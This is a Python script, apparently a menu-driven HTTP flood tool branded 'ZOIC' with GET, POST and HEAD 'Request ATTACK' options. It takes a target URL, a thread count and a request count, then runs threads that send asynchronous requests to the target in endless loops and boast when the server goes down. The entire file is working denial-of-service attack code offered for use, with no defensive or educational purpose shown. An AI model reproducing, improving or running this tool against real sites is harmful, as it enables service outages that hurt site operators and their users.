import os
import sys
import asyncio
import aiohttp
import threading

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m" 
    RADICAL_RED = "\033[38;5;160m"
    DARK_GREEN = "\033[38;5;28m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.LIGHT_GREEN + """
        ██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗
        ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║
        ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝
        ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝ 
        ███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║  
        ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝  
          
╔════════════════════════════════════════════════════════════════════╗
║                    https://doxwebd.serveo.net                      ║ 
║════════════════════════════════════════════════════════════════════║
║                                                                    ║                       
║                     [1] GET  Request ATTACK                        ║
║                     [2] POST Request ATTACK                        ║
║                     [3] HEAD Request ATTACK                        ║
║                     [4] EXIT                                       ║
║                                                                    ║                                                                     
╚════════════════════════════════════════════════════════════════════╝
""")

def layer7():
    while True:
        logo()
        select = input(TextColors.DARK_GREEN + """═══[root@ZOIC~$]                                                                   
═══> """ + TextColors.RESET)

        if select == "1" or select.lower() == "1":
            async def send_request(session, url):
                try:
                    async with session.get(url) as response:
                        print(TextColors.CYAN + f"[+] Url : {url} [*] GET Request : {get_requests}" + TextColors.RESET)
                except aiohttp.ClientConnectorError:
                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                except aiohttp.client_exceptions.ServerDisconnectedError:
                    print(TextColors.CRIMSON + f"[-] Server disconnected ZOIC !!" + TextColors.RESET)
                except Exception as e:
                    print(TextColors.CRIMSON + f"[-] Unexpected error: {str(e)}" + TextColors.RESET)

            async def send_requests(url, get_requests):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_request(session, url) for _ in range(get_requests)]
                    await asyncio.gather(*tasks)

            def send_thread(url, get_requests):
                while True:
                    asyncio.run(send_requests(url, get_requests))

            def start_threads(url, threads, get_requests):
                threads = []
                for _ in range(get_requests):
                    thread = threading.Thread(target=send_thread, args=(url, get_requests))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()  

            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.WHITE + "Thread (10~50) > "+ TextColors.RESET))  
            get_requests = int(input(TextColors.WHITE + "Get (100~1000) > "+ TextColors.RESET))    

            start_threads(url, threads, get_requests)


        elif select == "2" or select.lower() == "2":
            async def send_post_request(session, url):
                try:
                    async with session.post(url) as response:
                        print(TextColors.CYAN + f"[+] Url : {url} [*] POST Request : {post_requests}" + TextColors.RESET)
                except aiohttp.ClientConnectorError:
                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                except aiohttp.client_exceptions.ServerDisconnectedError:
                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
                except Exception as e:
                    print(TextColors.CRIMSON + f"[-] Unexpected error: {str(e)}" + TextColors.RESET)

            async def send_requests(url, num_requests):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_post_request(session, url) for _ in range(num_requests)]
                    await asyncio.gather(*tasks)

            def send_thread(url, num_requests):
                while True:
                    asyncio.run(send_requests(url, num_requests))

            def start_threads(url, num_threads, num_requests):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, num_requests))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()

            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.WHITE + "Thread (10~50) > "+ TextColors.RESET))  
            post_requests = int(input(TextColors.WHITE + "Get (100~1000) > "+ TextColors.RESET))   

            start_threads(url, threads, post_requests)

        elif select == "3" or select.lower() == "3":
            async def send_head_request(session, url):
                try:
                    async with session.head(url) as response:
                        print(TextColors.CYAN + f"[+] Url : {url} [*] HEAD Request : {head_requests}" + TextColors.RESET)
                except aiohttp.ClientConnectorError:
                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                except aiohttp.client_exceptions.ServerDisconnectedError:
                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
                except Exception as e:
                    print(TextColors.CRIMSON + f"[-] Unexpected error: {str(e)}" + TextColors.RESET)

            async def send_requests(url, num_requests):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_head_request(session, url) for _ in range(num_requests)]
                    await asyncio.gather(*tasks)

            def send_thread(url, num_requests):
                while True:
                    asyncio.run(send_requests(url, num_requests))

            def start_threads(url, num_threads, num_requests):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, num_requests))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()

            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.WHITE + "Thread (10~50) > "+ TextColors.RESET))  
            head_requests = int(input(TextColors.WHITE + "Get (100~1000) > "+ TextColors.RESET))  

            start_threads(url, threads, head_requests)


        elif select == "4" or select.lower() == "4":
            sys.exit()
    
             


if __name__ == "__main__":
    layer7()